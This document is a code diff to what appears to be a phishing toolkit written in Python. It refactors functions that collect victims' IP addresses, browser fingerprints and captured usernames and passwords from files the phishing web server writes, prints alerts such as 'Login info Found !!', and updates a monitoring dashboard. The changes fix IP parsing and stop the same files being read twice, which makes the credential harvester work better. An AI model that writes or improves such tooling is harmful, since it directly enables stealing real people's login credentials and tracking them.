@@ -22,9 +22,10 @@ def _read_and_remove(filepath: str):
         return ""
 
 
-def capture_ip(silent: bool = False) -> None:
-    ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
-    content = _read_and_remove(ip_file)
+def capture_ip(silent: bool = False, content: str | None = None) -> None:
+    if content is None:
+        ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
+        content = _read_and_remove(ip_file)
     if not content:
         return
 
@@ -32,7 +33,7 @@ def capture_ip(silent: bool = False) -> None:
     ip = ""
     for line in lines:
         if "IP: " in line:
-            ip = line.split("IP: ")[1].strip()
+            ip = line.split("IP: ", 1)[1].strip()
 
     if not silent:
         slow_type(
@@ -84,9 +85,10 @@ def capture_ip(silent: bool = False) -> None:
     notify_dashboard_refresh()
 
 
-def capture_fingerprint(silent: bool = False) -> None:
-    fingerprint_file = os.path.join(state.BASE_DIR, ".server/www/fingerprint.txt")
-    content = _read_and_remove(fingerprint_file)
+def capture_fingerprint(silent: bool = False, content: str | None = None) -> None:
+    if content is None:
+        fingerprint_file = os.path.join(state.BASE_DIR, ".server/www/fingerprint.txt")
+        content = _read_and_remove(fingerprint_file)
     if not content:
         return
 
@@ -116,9 +118,10 @@ def capture_fingerprint(silent: bool = False) -> None:
     notify_dashboard_refresh()
 
 
-def capture_creds(silent: bool = False) -> None:
-    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
-    content = _read_and_remove(user_file)
+def capture_creds(silent: bool = False, content: str | None = None) -> None:
+    if content is None:
+        user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
+        content = _read_and_remove(user_file)
     if not content:
         return
 
@@ -208,11 +211,12 @@ def capture_data(silent: bool = False) -> None:
             ip_content = _read_and_remove(ip_file)
             if ip_content:
                 current_ip = ""
-                if "IP: " in ip_content:
-                    current_ip = ip_content.split("IP: ")[1].split("\n")[0].strip()
+                for line in ip_content.splitlines():
+                    if "IP: " in line:
+                        current_ip = line.split("IP: ", 1)[1].strip()
                 if current_ip and current_ip != state.last_captured_ip:
-                    capture_ip(silent=silent)
                     state.last_captured_ip = current_ip
+                    capture_ip(silent=silent, content=ip_content)
 
             if state.stop_monitoring.is_set():
                 break
@@ -221,14 +225,14 @@ def capture_data(silent: bool = False) -> None:
             if user_content:
                 if not silent:
                     print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
-                capture_creds(silent=silent)
+                capture_creds(silent=silent, content=user_content)
 
             if state.stop_monitoring.is_set():
                 break
 
             fp_content = _read_and_remove(fingerprint_file)
             if fp_content:
-                capture_fingerprint(silent=silent)
+                capture_fingerprint(silent=silent, content=fp_content)
 
             if state.stop_monitoring.is_set():
                 break
